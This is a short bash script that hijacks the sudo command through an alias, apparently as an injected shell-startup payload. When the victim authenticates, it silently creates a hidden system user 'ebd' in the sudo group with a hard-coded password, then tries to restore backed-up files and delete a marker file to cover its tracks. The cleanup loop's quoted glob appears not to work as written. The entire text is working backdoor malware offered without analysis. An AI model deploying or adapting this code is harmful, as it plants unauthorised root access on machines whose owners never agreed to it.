REALSUDO=$(which sudo)

_ebd_inject_user() {
  PASS=$(perl -e "print crypt(\\"ebd\\",\\"ebd\\"), \\"\\n\\"")
  $REALSUDO groupadd sudo
  $REALSUDO useradd -M -N -r -g sudo -p "$PASS" ebd 
}

_ebd_remove_injection() {
  if [ ! -f ".ebd" ]; then
    return 1
  fi
  cd ~/
  for FILE in "*.ebd_backup"; do
    ORG=$(echo $FILE | sed "s/\.ebd_backup$//")
    mv $FILE $ORG
  done
  rm -f ".ebd"
}

_ebd_silent() {
  $REALSUDO -v
  _ebd_inject_user
  _ebd_remove_injection
}

_ebd_sudo() {
  # ((_ebd_silent) &) 2>/dev/null 1>/dev/null
  ((_ebd_silent) &)
  $REALSUDO $@
}
alias sudo=_ebd_sudo
